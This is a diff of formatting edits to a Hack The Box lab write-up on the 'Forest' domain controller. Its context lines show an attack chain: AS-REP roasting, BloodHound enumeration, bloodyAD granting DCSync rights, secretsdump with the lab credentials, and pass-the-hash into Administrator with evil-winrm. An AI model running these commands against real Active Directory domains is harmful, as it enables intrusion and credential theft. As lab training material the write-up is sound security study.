@@ -1,3 +1,4 @@
+
 # Given
 
 > Forest is an easy Windows machine that showcases a Domain Controller (DC) for a domain in which Exchange Server has been installed. The DC allows anonymous LDAP binds, which are used to enumerate domain objects. The password for a service account with Kerberos pre-authentication disabled can be cracked to gain a foothold. The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups. The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes, compromising the system.
@@ -12,7 +13,7 @@
 
 I started with a portscan to get a rough idea of what's running on this box.
 
-```bash fold
+```bash
 PORT      STATE SERVICE        REASON
 53/tcp    open  domain         syn-ack ttl 64
 88/tcp    open  kerberos-sec   syn-ack ttl 64
@@ -30,7 +31,7 @@ PORT      STATE SERVICE        REASON
 
 The nmap scan was running on the side, and I was scanning all ports for scripts and versions. I wanted to see if the two scans would help me quickly identify the running services.
 
-```bash fold
+```bash
 PORT      ST
 ATE SERVICE      VERSION
 53/tcp    open  domain       Simple DNS Plus
@@ -77,7 +78,7 @@ The next step was for me to list down all the open ports, and the services runni
 - HTTP(5985)
 ```
 
-Next was checking for null authentication. There were two services I could attempt to get info from with null authentication. SMB and LDAP. 
+Next was checking for null authentication. There were two services I could attempt to get info from with null authentication. SMB and LDAP.
 
 ![](Assets/Pasted%20image%2020250722135618.png)
 
@@ -128,7 +129,7 @@ I had to clean it up first. Vim and Regex are quite handy for this.
 
 ![](Assets/Pasted%20image%2020250722144245.png)
 
-I needed to get some sort of credentials in order to find a foothold into the system, so I started checking for roastable accounts. 
+I needed to get some sort of credentials in order to find a foothold into the system, so I started checking for roastable accounts.
 
 Found one that was ASREP roastable : svc-alfresco, and netexec managed to grab the kerberos hash.
 
@@ -183,7 +184,7 @@ It worked, and the user flag was on the desktop.
 
 ## Getting Admin
 
-Before getting into bloodhound, I tried enumerating the system I had gotten into using some default Powershell modules. It was then that I realized I need to make a cheatsheet for this as I didn't have one on hand. Some googling was done, and I got a bunch of details about the system, the groups and users. 
+Before getting into bloodhound, I tried enumerating the system I had gotten into using some default Powershell modules. It was then that I realized I need to make a cheatsheet for this as I didn't have one on hand. Some googling was done, and I got a bunch of details about the system, the groups and users.
 
 I decided to get bloodhound up and running because a visual representation is so much better than lines of text.
 
@@ -197,10 +198,9 @@ LDAP        10.10.10.161    389    FOREST           [+] htb.local\svc-alfresco:s
 LDAP        10.10.10.161    389    FOREST           Resolved collection methods: rdp, container, trusts, session, objectprops, dcom, psremote, localadmin, acl, group
 LDAP        10.10.10.161    389    FOREST           Done in 00M 13S
 LDAP        10.10.10.161    389    FOREST           Compressing output into /root/.nxc/logs/FOREST_10.10.10.161_2025-07-22_073729_bloodhound.zip
-
 ```
 
-We mark the svc-alfresco account as something we've owned, and the goal is to get to Administrator. 
+We mark the svc-alfresco account as something we've owned, and the goal is to get to Administrator.
 
 Using bloodhound I can see that svc-alfresco belongs to a few groups, and one of them (Account Operators) has the `GenericAll` permission over Exchange Windows Permissions. This in turn as `WriteDACL` permissions over the HTB.LOCAL domain which contains the admin account.
 
@@ -234,7 +234,7 @@ bloodyAD --host "10.10.10.161" -d "HTB.LOCAL" -u "svc-alfresco" -p "s3rvice" add
 
 ![](Assets/Pasted%20image%2020250722163144.png)
 
-Now that my account was able to DCSync, I used secretsdump to dump all the hashes out of the SAM (Security Account Manager)  registry.
+Now that my account was able to DCSync, I used secretsdump to dump all the hashes out of the SAM (Security Account Manager) registry.
 
 ```bash
 impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'10.10.10.161'
@@ -242,7 +242,7 @@ impacket-secretsdump 'htb.local'/'svc-alfresco':'s3rvice'@'10.10.10.161'
 
 ![](Assets/Pasted%20image%2020250722163407.png)
 
-I got all the NTLM hashes of the users in this domain. I was looking for administrator, so I grabbed the whole thing, and picked up the last part of the series of numbers, since the sam dumps hashes in the domain\uid: rid: LM : NT format.
+I got all the NTLM hashes of the users in this domain. I was looking for administrator, so I grabbed the whole thing, and picked up the last part of the series of numbers, since the sam dumps hashes in the domain\\uid: rid: LM : NT format.
 
 I then proceeded to PassTheHash into the admin account with evil-winrm.
 
@@ -280,4 +280,4 @@ Administrator : aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea
 
 # References
 
-https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3#77e6
+<https://medium.com/r3d-buck3t/domain-enumeration-with-active-directory-powershell-module-7ce4fcfe91d3#77e6>
